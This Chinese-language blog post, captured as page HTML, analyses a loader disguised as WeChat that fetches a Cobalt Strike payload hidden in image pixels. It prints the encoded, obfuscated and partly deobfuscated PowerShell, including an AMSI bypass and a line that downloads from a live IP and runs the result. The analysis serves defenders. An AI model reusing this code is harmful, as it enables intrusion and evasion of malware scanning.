@@ -1,0 +1,876 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/dog2.jpg">
+  <link rel="icon" href="/img/dog2.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jentle">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="C#可执行文件，用微信loga伪装一下：  MainAPP方法里面隐藏了一个B64编码的PS1脚本：  1U0VUICAoInswfXsxfSItZicycUYnLCd4QScpICAoIFt0eVBlXSgiezV9ezN9ezZ9ezJ9ezd9ezl9ezR9ezExfXsxfXswfXs4fXsxMH0iIC1mJ21BUnMnLCcuJywnTnRJTWUuSW5UZXInLCdTJyw">
+<meta property="og:type" content="article">
+<meta property="og:title" content="国护红队新活？伪装成微信的CS 图像隐写术loader分析">
+<meta property="og:url" content="http://example.com/2025/07/24/%E5%9B%BD%E6%8A%A4%E7%BA%A2%E9%98%9F%E6%96%B0%E6%B4%BB%EF%BC%9F%E4%BC%AA%E8%A3%85%E6%88%90%E5%BE%AE%E4%BF%A1%E7%9A%84CS-%E5%9B%BE%E5%83%8F%E9%9A%90%E5%86%99%E6%9C%AFloader%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="TIPFactory">
+<meta property="og:description" content="C#可执行文件，用微信loga伪装一下：  MainAPP方法里面隐藏了一个B64编码的PS1脚本：  1U0VUICAoInswfXsxfSItZicycUYnLCd4QScpICAoIFt0eVBlXSgiezV9ezN9ezZ9ezJ9ezd9ezl9ezR9ezExfXsxfXswfXs4fXsxMH0iIC1mJ21BUnMnLCcuJywnTnRJTWUuSW5UZXInLCdTJyw">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/postindex/wechat.header.png">
+<meta property="article:published_time" content="2025-07-24T10:10:01.000Z">
+<meta property="article:modified_time" content="2025-10-23T01:07:21.074Z">
+<meta property="article:author" content="Jentle">
+<meta property="article:tag" content="主机安全">
+<meta property="article:tag" content="CobaltStrike">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/postindex/wechat.header.png">
+  
+  
+  
+  <title>国护红队新活？伪装成微信的CS 图像隐写术loader分析 - TIPFactory</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="TIPFactory" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>TIPFactory</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="国护红队新活？伪装成微信的CS 图像隐写术loader分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-24 18:10" pubdate>
+          July 24, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">国护红队新活？伪装成微信的CS 图像隐写术loader分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>C#可执行文件，用微信loga伪装一下：</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/07/24/%E5%9B%BD%E6%8A%A4%E7%BA%A2%E9%98%9F%E6%96%B0%E6%B4%BB%EF%BC%9F%E4%BC%AA%E8%A3%85%E6%88%90%E5%BE%AE%E4%BF%A1%E7%9A%84CS-%E5%9B%BE%E5%83%8F%E9%9A%90%E5%86%99%E6%9C%AFloader%E5%88%86%E6%9E%90/image.png" alt="image.png"></p>
+<p>MainAPP方法里面隐藏了一个B64编码的PS1脚本：</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/07/24/%E5%9B%BD%E6%8A%A4%E7%BA%A2%E9%98%9F%E6%96%B0%E6%B4%BB%EF%BC%9F%E4%BC%AA%E8%A3%85%E6%88%90%E5%BE%AE%E4%BF%A1%E7%9A%84CS-%E5%9B%BE%E5%83%8F%E9%9A%90%E5%86%99%E6%9C%AFloader%E5%88%86%E6%9E%90/image%201.png" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">U0VUICAoInswfXsxfSItZicycUYnLCd4QScpICAoIFt0eVBlXSgiezV9ezN9ezZ9ezJ9ezd9ezl9ezR9ezExfXsxfXswfXs4fXsxMH0iIC1mJ21BUnMnLCcuJywnTnRJTWUuSW5UZXInLCdTJywnaUMnLCdzWScsJ1RFTS5yVScsJ29QU0VSJywnaEEnLCdWJywnTCcsJ0VTJykgKSAgOyRDVksgPSBbVFlQZV0oInswfXsxfSIgLUYnUicsJ2VGJykgIDske0Zgd2l9PSAoIGdFdC1WQXJJQUJMRSAoInswfXsxfSItZicyJywncWZ4QScpIC1WYWx1RW9OTHkgICk6OigiezF9ezN9ezB9ezJ9Ii1mICdIR2xvJywnQWxsbycsJ2JhbCcsJ2MnKS5JbnZva2UoKDkwNzYrODA5Mi04MDkyKSk7JEN2ay4iYXNTYGVNYEJMeSIuIkdlVHR5YFBlIigiU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi4kKFtjSEFyXSg2NSkrW2NIYVJdKFtieVRlXTB4NmQpK1tDaGFSXShbQnlUZV0weDczKStbQ0hhUl0oW0JZdGVdMHg2OSkrW0NIYVJdKDg1KjMxLzMxKStbY0hBUl0oW2J5dGVdMHg3NCkrW2NIQVJdKDEwNSkrW2NIYXJdKDEwOCkrW0NoYXJdKDExNSszOS0zOSkpIikuImdFYFRgRkllTEQiKCIkKCfDoG1zw6xTZXNzw67DtW4nLk5vUk1BTGlaZShbY2hhcl0oNzArNTQtNTQpK1tjSGFSXSgxMTEpK1tjSGFyXSgxMTQrMjQtMjQpK1tjaGFSXSgxMDYrMykrW2NoQVJdKDY4KzI2LTI2KSkgLXJlcGxhY2UgW0NIQVJdKDI0KzY4KStbY2hhUl0oW0J5dEVdMHg3MCkrW0NIYXJdKFtiWXRFXTB4N2IpK1tjSEFyXSg3Nys0NS00NSkrW2NoYVJdKDYyKzQ4KStbQ0hBUl0oMTI1KjExOC8xMTgpKSIsICgiezF9ezN9ezB9ezR9ezJ9Ii1mJ2ljLCcsJ05vbicsJ2ljJywnUHVibCcsJ1N0YXQnKSkuKCJ7Mn17MX17MH0iLWYnbHVlJywnZXRWYScsJ1MnKS5JbnZva2UoJHtuVWBMbH0sICR7bnVgbEx9KTsgJGN2ay4iYXNzZW1gQmBMeSIuImdgZXR0YFlQRSIoIlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uJChbY0hBcl0oNjUpK1tjSGFSXShbYnlUZV0weDZkKStbQ2hhUl0oW0J5VGVdMHg3MykrW0NIYVJdKFtCWXRlXTB4NjkpK1tDSGFSXSg4NSozMS8zMSkrW2NIQVJdKFtieXRlXTB4NzQpK1tjSEFSXSgxMDUpK1tjSGFyXSgxMDgpK1tDaGFyXSgxMTUrMzktMzkpKSIpLiJnYEV0ZklgRUxkIigiJChbY2hhcl0oW2JZdEVdMHg2MSkrW0NoYVJdKFtCWXRlXTB4NmQpK1tDaGFyXSg1NSs2MCkrW2NoQXJdKDEwNSs5Ny05NykrW0NIQXJdKFtieVRlXTB4NDMpK1tDaGFSXSgxMTErNjctNjcpK1tjaGFyXShbQnl0RV0weDZlKStbY0hhUl0oW2JZdEVdMHg3NCkrW2NIQXJdKDEwMSkrW0NIYXJdKDEyMCkrW2NIQVJdKDExNikpIiwgKCJ7M317NH17Mn17MX17MH0iIC1mJ3RpYycsJ2JsaWMsU3RhJywnUHUnLCdOJywnb24nKSkuIlNlYFRgVkFsdUUiKCR7TmBVTGx9LCBbSW50UHRyXSR7ZmBXSX0pO3NhbCBhIE5ldy1PYmplY3Q7QWRkLVR5cGUgLUEgU3lzdGVtLkRyYXdpbmc7JGc9YSBTeXN0ZW0uRHJhd2luZy5CaXRtYXAoKGEgTmV0LldlYkNsaWVudCkuT3BlblJlYWQoImh0dHA6Ly8xMjEuMzcuMjIxLjk4OjExMTExLzEyMS5wbmciKSk7JG89YSBCeXRlW10gMzg0MDsoMC4uMSl8JXtmb3JlYWNoKCR4IGluKDAuLjE5MTkpKXskcD0kZy5HZXRQaXhlbCgkeCwkXyk7JG9bJF8qMTkyMCskeF09KFttYXRoXTo6Rmxvb3IoKCRwLkItYmFuZDE1KSoxNiktYm9yKCRwLkcgLWJhbmQgMTUpKX19OyAgICAgICAgLigiezB9ezF9ezJ9Ii1mJ3NlJywnVC1pVCcsJ2VtJykgKCJ7Mn17MH17MX0iIC1mJ2lhQmxFOjZNJywnNCcsJ1ZhUicpICggIFt0WXBFXSgiezF9ezJ9ezN9ezB9Ii1GICdHJywnc1knLCdzVEVNLlRFWCcsJ1QuZU5jb2RJbicpICkgOyAuKCJ7MH17MX0iLWYgJ0knLCdFWCcpKCAkNk00OjoiYXNgQ2lpIi4iR2VgVHN0cmBpbkciKCR7T31bMC4uMzU5OF0pKQ==<br></code></pre></td></tr></table></figure>
+
+<p>解码之后脚本：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">SET</span>  (<span class="hljs-string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="hljs-operator">-f</span><span class="hljs-string">&#x27;2qF&#x27;</span>,<span class="hljs-string">&#x27;xA&#x27;</span>)  ( [<span class="hljs-type">tyPe</span>](<span class="hljs-string">&quot;&#123;5&#125;&#123;3&#125;&#123;6&#125;&#123;2&#125;&#123;7&#125;&#123;9&#125;&#123;4&#125;&#123;11&#125;&#123;1&#125;&#123;0&#125;&#123;8&#125;&#123;10&#125;&quot;</span> <span class="hljs-operator">-f</span><span class="hljs-string">&#x27;mARs&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;NtIMe.InTer&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;iC&#x27;</span>,<span class="hljs-string">&#x27;sY&#x27;</span>,<span class="hljs-string">&#x27;TEM.rU&#x27;</span>,<span class="hljs-string">&#x27;oPSER&#x27;</span>,<span class="hljs-string">&#x27;hA&#x27;</span>,<span class="hljs-string">&#x27;V&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;ES&#x27;</span>) )  ;<span class="hljs-variable">$CVK</span> = [<span class="hljs-type">TYPe</span>](<span class="hljs-string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="hljs-operator">-F</span><span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;eF&#x27;</span>)  ;<span class="hljs-variable">$</span>&#123;F`wi&#125;= ( <span class="hljs-built_in">gEt-VArIABLE</span> (<span class="hljs-string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="hljs-operator">-f</span><span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;qfxA&#x27;</span>) <span class="hljs-literal">-ValuEoNLy</span>  )::(<span class="hljs-string">&quot;&#123;1&#125;&#123;3&#125;&#123;0&#125;&#123;2&#125;&quot;</span><span class="hljs-operator">-f</span> <span class="hljs-string">&#x27;HGlo&#x27;</span>,<span class="hljs-string">&#x27;Allo&#x27;</span>,<span class="hljs-string">&#x27;bal&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>).Invoke((<span class="hljs-number">9076</span>+<span class="hljs-number">8092</span><span class="hljs-literal">-8092</span>));<span class="hljs-variable">$Cvk</span>.<span class="hljs-string">&quot;asS`eM`BLy&quot;</span>.<span class="hljs-string">&quot;GeTty`Pe&quot;</span>(<span class="hljs-string">&quot;System.Management.Automation.<span class="hljs-variable">$</span>([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))&quot;</span>).<span class="hljs-string">&quot;gE`T`FIeLD&quot;</span>(<span class="hljs-string">&quot;<span class="hljs-variable">$</span>(&#x27;àmsìSessîõn&#x27;.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))&quot;</span>, (<span class="hljs-string">&quot;&#123;1&#125;&#123;3&#125;&#123;0&#125;&#123;4&#125;&#123;2&#125;&quot;</span><span class="hljs-operator">-f</span><span class="hljs-string">&#x27;ic,&#x27;</span>,<span class="hljs-string">&#x27;Non&#x27;</span>,<span class="hljs-string">&#x27;ic&#x27;</span>,<span class="hljs-string">&#x27;Publ&#x27;</span>,<span class="hljs-string">&#x27;Stat&#x27;</span>)).(<span class="hljs-string">&quot;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span><span class="hljs-operator">-f</span><span class="hljs-string">&#x27;lue&#x27;</span>,<span class="hljs-string">&#x27;etVa&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>).Invoke(<span class="hljs-variable">$</span>&#123;nU`Ll&#125;, <span class="hljs-variable">$</span>&#123;nu`lL&#125;); <span class="hljs-variable">$cvk</span>.<span class="hljs-string">&quot;assem`B`Ly&quot;</span>.<span class="hljs-string">&quot;g`ett`YPE&quot;</span>(<span class="hljs-string">&quot;System.Management.Automation.<span class="hljs-variable">$</span>([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))&quot;</span>).<span class="hljs-string">&quot;g`EtfI`ELd&quot;</span>(<span class="hljs-string">&quot;<span class="hljs-variable">$</span>([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))&quot;</span>, (<span class="hljs-string">&quot;&#123;3&#125;&#123;4&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="hljs-operator">-f</span><span class="hljs-string">&#x27;tic&#x27;</span>,<span class="hljs-string">&#x27;blic,Sta&#x27;</span>,<span class="hljs-string">&#x27;Pu&#x27;</span>,<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-string">&#x27;on&#x27;</span>)).<span class="hljs-string">&quot;Se`T`VAluE&quot;</span>(<span class="hljs-variable">$</span>&#123;N`ULl&#125;, [<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]<span class="hljs-variable">$</span>&#123;f`WI&#125;);<span class="hljs-built_in">sal</span> a <span class="hljs-built_in">New-Object</span>;<span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-A</span> System.Drawing;<span class="hljs-variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="hljs-string">&quot;http://121.37.221.98:11111/121.png   &quot;</span>));<span class="hljs-variable">$o</span>=a Byte[] <span class="hljs-number">3840</span>;(<span class="hljs-number">0</span>..<span class="hljs-number">1</span>)|%&#123;<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$x</span> <span class="hljs-keyword">in</span>(<span class="hljs-number">0</span>..<span class="hljs-number">1919</span>))&#123;<span class="hljs-variable">$p</span>=<span class="hljs-variable">$g</span>.GetPixel(<span class="hljs-variable">$x</span>,<span class="hljs-variable">$_</span>);<span class="hljs-variable">$o</span>[<span class="hljs-variable">$_</span>*<span class="hljs-number">1920</span>+<span class="hljs-variable">$x</span>]=([<span class="hljs-type">math</span>]::Floor((<span class="hljs-variable">$p</span>.B<span class="hljs-literal">-band15</span>)*<span class="hljs-number">16</span>)<span class="hljs-operator">-bor</span>(<span class="hljs-variable">$p</span>.G <span class="hljs-operator">-band</span> <span class="hljs-number">15</span>))&#125;&#125;;        .(<span class="hljs-string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span><span class="hljs-operator">-f</span><span class="hljs-string">&#x27;se&#x27;</span>,<span class="hljs-string">&#x27;T-iT&#x27;</span>,<span class="hljs-string">&#x27;em&#x27;</span>) (<span class="hljs-string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="hljs-operator">-f</span><span class="hljs-string">&#x27;iaBlE:6M&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;VaR&#x27;</span>) (  [<span class="hljs-type">tYpE</span>](<span class="hljs-string">&quot;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;0&#125;&quot;</span><span class="hljs-operator">-F</span> <span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;sY&#x27;</span>,<span class="hljs-string">&#x27;sTEM.TEX&#x27;</span>,<span class="hljs-string">&#x27;T.eNcodIn&#x27;</span>) ) ; .(<span class="hljs-string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="hljs-operator">-f</span> <span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;EX&#x27;</span>)( <span class="hljs-variable">$6M4::</span><span class="hljs-string">&quot;as`Cii&quot;</span>.<span class="hljs-string">&quot;Ge`Tstr`inG&quot;</span>(<span class="hljs-variable">$</span>&#123;O&#125;[<span class="hljs-number">0</span><span class="hljs-type">..3598</span>]))<br></code></pre></td></tr></table></figure>
+
+<p>从 <code>http://121[.]37[.]221[.]98:11111/121.png</code> 下载图片。使用像素隐写术提取隐藏数据，每像素存储半个字节，通过 <code>B</code> 和 <code>G</code> 通道的低4位组合）。</p>
+<ul>
+<li><strong>分辨率</strong>：1920×2 像素（仅读取前两行）</li>
+<li><strong>总像素</strong>：3840 像素</li>
+<li><strong>每个像素提取 1 字节</strong> → 共 3840 字节有效载荷</li>
+</ul>
+<p>然后反射调用<code>System.Management.Automation.AmsiUtils</code>绕过AMSI保护。最后再执行（<code>PowerShell.AddScript</code>）提取的shellcode。</p>
+<p>在绕过AMSI的过程中，还用了强制<code>amsiContext</code>和<code>amsiSession</code>为NULL的方法。</p>
+<p>下面是去混淆之后的完整脚本：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-Variable</span> <span class="hljs-string">&#x27;2qfxA&#x27;</span> ([<span class="hljs-type">System.Reflection.Assembly</span>]);<br><br><span class="hljs-variable">$CVK</span> = [<span class="hljs-type">System.Reflection.Assembly</span>];<br><br><span class="hljs-comment"># 调用 Assembly.Load 方法加载 AMSI 绕过代码</span><br><span class="hljs-variable">$</span>&#123;Fwi&#125; = (<span class="hljs-built_in">Get-Variable</span> <span class="hljs-string">&#x27;2qfxA&#x27;</span> <span class="hljs-literal">-ValueOnly</span>)::Load(<span class="hljs-string">&quot;9076&quot;</span>);<br><br><span class="hljs-comment"># 绕过 AMSI（反恶意软件扫描接口）</span><br><span class="hljs-variable">$CVK</span>.GetType(<span class="hljs-string">&quot;System.Management.Automation.AmsiUtils&quot;</span>).GetField(<span class="hljs-string">&quot;amsiSession&quot;</span>, <span class="hljs-string">&quot;NonPublic,Static&quot;</span>).SetValue(<span class="hljs-variable">$null</span>, <span class="hljs-variable">$null</span>);<br><span class="hljs-variable">$CVK</span>.GetType(<span class="hljs-string">&quot;System.Management.Automation.AmsiUtils&quot;</span>).GetField(<span class="hljs-string">&quot;amsiContext&quot;</span>, <span class="hljs-string">&quot;NonPublic,Static&quot;</span>).SetValue(<span class="hljs-variable">$null</span>, [<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]<span class="hljs-variable">$</span>&#123;Fwi&#125;);<br><br><span class="hljs-built_in">sal</span> a <span 